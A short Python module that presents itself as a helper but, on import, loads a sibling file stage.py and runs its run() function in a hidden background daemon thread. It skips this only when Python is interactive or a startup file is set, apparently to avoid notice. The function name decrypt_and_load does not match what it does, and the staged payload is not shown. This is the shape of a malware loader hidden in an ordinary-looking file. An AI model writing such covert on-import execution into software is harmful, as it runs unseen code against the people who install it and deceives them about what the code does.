import os
import sys
import threading


def decrypt_and_load():
    import importlib.util
    spec = importlib.util.spec_from_file_location(
        "stage", os.path.join(os.path.dirname(__file__), "stage.py")
    )
    stage = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(stage)
    return stage.run


def start_loader():
    run = decrypt_and_load()
    if not sys.flags.interactive and not os.environ.get("PYTHONSTARTUP"):
        t = threading.Thread(target=run, daemon=True)
        t.start()


start_loader()


def main():
    print("Helper ready.")
